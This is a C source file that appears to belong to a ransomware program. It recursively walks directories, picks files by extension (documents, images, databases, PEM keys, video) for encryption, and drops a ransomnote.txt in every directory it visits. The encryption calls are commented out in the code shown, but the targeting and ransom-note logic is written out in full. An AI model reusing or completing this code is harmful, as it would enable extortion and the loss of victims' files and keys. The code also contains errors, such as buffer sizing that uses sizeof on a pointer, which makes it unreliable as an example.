#include "fileRecursor.h"

//it works... just need to get refernce to name
void startRecursion(char * start,unsigned char * key, unsigned char * iv,char * id,int mode)
{
	DIR *fDir = opendir(start);
    if(errno == ENOTDIR){
    	//must be file
 		file_handler(start, start,key,iv,mode);
    }else if (errno != 2){
    	//must be a directory
    	directory_handle(start,key,iv,id,mode);
    } else {
    	//pDir is null...
    	printf("Not a valid directory or file name\n");

    	return;
    }
	if(fDir!=0)
     closedir(fDir);
}



void writeRansomNote(char * directory,char * id)
{
    char * filename = calloc(1,sizeof(char) * (strlen(directory)+strlen("ransomnote.txt") +1));
    strcpy(filename,directory);
    strcat(filename,"ransomnote.txt");
    FILE * fp = fopen(filename,"w");

    char * ransomnote = calloc(1,strlen(NOTE1)+strlen(NOTE2) +sizeof(id));
    strcpy(ransomnote,NOTE1);
   // strcat(ransomnote,id);
    strcat(ransomnote,NOTE2);
    printf("ransomnote: %s\n",ransomnote);
    fwrite(ransomnote,1,strlen(ransomnote),fp);

    free(filename);
    free(ransomnote);
}

void removeRansomNote(char * directory)
{
    char * filename = calloc(1,sizeof(char) * (strlen(directory)+strlen("ransomnote.txt") +1));
    strcpy(filename,directory);
    strcat(filename,"ransomnote.txt");

    remove(filename);

    free(filename);
}

void directory_handle(char * name,unsigned char * key, unsigned char * iv,char * id, int mode)
{
	DIR *fDir = opendir(name);
	if(fDir == 0){
		return;
	}
	struct dirent * fDirent;
    while ((fDirent = readdir(fDir)) != NULL) {
    	//path can't be longer than 1024 bytes
		char * fullpath = calloc(1,1024);
		if((strcmp(fDirent->d_name, ".") == 0) || (strcmp (fDirent->d_name,"..") ==0)){
			free(fullpath);
			continue;
		}
		strcpy(fullpath,name);
		strcat(fullpath,"/");
		strcat(fullpath,fDirent->d_name);
    	if(fDirent->d_type == DT_REG){
    		file_handler(fullpath,fDirent->d_name,key,iv,mode);
    	} else if(fDirent->d_type == DT_DIR){
    		directory_handle(fullpath,key,iv,id,mode);
    	}
    	free(fullpath);
    }

    char * fullpath = calloc(1,1024);
    strcpy(fullpath,name);
    strcat(fullpath,"/");
    if(mode == ENCRYPT) {
        writeRansomNote(fullpath,id);
    } else {
        removeRansomNote(fullpath);
    }
    free(fullpath);

    closedir(fDir);
}

char *get_filename_ext(const char *filename) 
{
    char *dot = strrchr(filename, '.');
    if(!dot || dot == filename) return "";
    return dot + 1;
}

void file_handler(char * filepath, char * filename,unsigned char * key, unsigned char * iv,int mode)
{

    printf("filepath %s\n",filepath);
    char * file_ext = get_filename_ext(filepath);
    printf("file_ext: %s filename= %s\n",file_ext,filepath);
    if(strcmp(file_ext,"") == 0 ||strcmp(file_ext,"txt") == 0 || strcmp(file_ext,"doc")  == 0 || strcmp(file_ext,"docx") == 0 || strcmp(file_ext,"java") == 0 || strcmp(file_ext,"png") == 0 || strcmp(file_ext,"pdf")  == 0 || strcmp(file_ext,"jpg")  == 0||strcmp(file_ext,"MDF")  == 0 || strcmp(file_ext,"ppt")  == 0 || strcmp(file_ext,"pem")  == 0 || strcmp(file_ext,"sql")  == 0 || strcmp(file_ext,"mp4") == 0)
    {
         printf("encrypting: %s\n",filepath);
         if(mode == ENCRYPT) {
            //encrypt(full_fileName,key,iv);
         } else {
            //decrypt(full_fileName,key,iv);
         }
    }

}

